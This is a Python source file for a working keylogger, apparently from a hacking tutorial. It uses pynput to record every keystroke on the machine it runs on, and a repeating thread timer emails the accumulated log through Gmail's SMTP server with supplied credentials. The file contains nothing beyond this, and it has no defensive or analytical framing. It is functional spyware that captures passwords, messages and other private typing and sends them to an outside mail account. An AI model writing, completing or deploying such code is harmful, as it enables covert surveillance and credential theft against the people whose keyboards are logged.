#!/usr/bin/env python
#  https://pypi.org/project/pynput/
import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = '[+] Key logger started'
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:  # Except special keys
            if key == key.space:  # Show spaces instead of key.space
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    # This function use the threading module to aloud the script to process other functions at the same time
    def report(self):
        print(self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""  # reset log data
        timer = threading.Timer(self.interval, self.report)  # Threading this function recursively
        timer.start()

    # Send an email with a specific message
    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)  # Google mail server port 587
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)  # Send email to yourself
        server.quit()

    def start(self):
        # Create an instance of Listener
        # When a key is pressed, call process_key_press function
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
